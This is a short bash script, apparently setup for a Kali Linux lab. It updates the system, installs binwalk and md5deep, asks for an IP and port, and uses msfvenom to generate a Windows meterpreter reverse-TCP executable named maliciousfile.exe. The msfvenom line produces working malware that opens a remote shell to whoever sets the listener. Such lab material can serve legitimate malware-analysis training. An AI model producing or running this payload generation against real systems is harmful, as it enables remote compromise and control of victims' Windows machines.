#!/bin/bash

#install binwalk

echo "updating your kali..."

apt-get update

echo "Installing binwalk..."

apt-get install binwalk -y

echo "installing md5deep hashing tool..."
apt-get install md5deep -y
echo "Enter your IP LHOST (you can get your ip using ifconfig :"
read Lhost 

echo "Enter your Listening Port LPORT"
read Lport

echo "Generating payloads..."

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$Lhost LPORT=$Lport -f exe -o maliciousfile.exe

chmod +x dolab.sh
